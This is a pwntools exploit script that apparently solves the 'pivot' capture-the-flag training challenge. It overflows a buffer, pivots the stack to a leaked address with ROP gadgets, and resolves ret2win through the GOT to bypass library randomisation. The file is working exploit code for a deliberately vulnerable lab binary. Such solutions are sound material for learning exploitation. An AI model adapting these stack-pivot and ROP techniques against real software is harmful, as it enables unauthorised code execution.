from pwn import *

context.binary = elf = ELF('./pivot')

lib = ELF('./libpivot.so')
off_to_win = lib.sym['ret2win'] - lib.sym['foothold_function']

p = elf.process()
#gdb.attach(p)

offset = 40

pop_rax      = 0x004009bb # pop rax; ret;
xchg_rsp_rax = 0x004009bd # xchg rsp, rax; ret;
rax_eq_mrax  = 0x004009c0 # mov rax, qword [rax]
rax_pl_ebp   = 0x004009c4 # add rax, rbp
pop_rbp      = 0x00400829
jmp_rax      = 0x004007c1 # jmp rax;

pop_rsi_x = 0x0000000000400a31 # pop rsi; pop r15; ret; 
pop_rdi   = 0x0000000000400a33 # pop rdi; ret; 

'''
#read
mov edx, 0x100  ; size_t nbyte
mov rsi, rax    ; void *buf
mov edi, 0      ; int fildes
'''

p.readuntil("pivot: ")
pivot_best_place = int(str(p.readline()[:-1])[2:-1], 16)
log.info(f'Pivot best place: {hex(pivot_best_place)}')

pyl  = p64(elf.plt['foothold_function'])
pyl += p64(pop_rax)+p64(elf.got['foothold_function'])
pyl += p64(pop_rbp)+p64(off_to_win)
pyl += p64(rax_eq_mrax)
pyl += p64(rax_pl_ebp)
pyl += p64(jmp_rax)

p.sendline(pyl)

pyl  = b'A'*offset
pyl += p64(pop_rax)+p64(pivot_best_place)
pyl += p64(xchg_rsp_rax)

p.readline()
p.readline()
p.readline()
p.readline()

p.sendline(pyl)
print(str(p.recvall())[-35:-3])


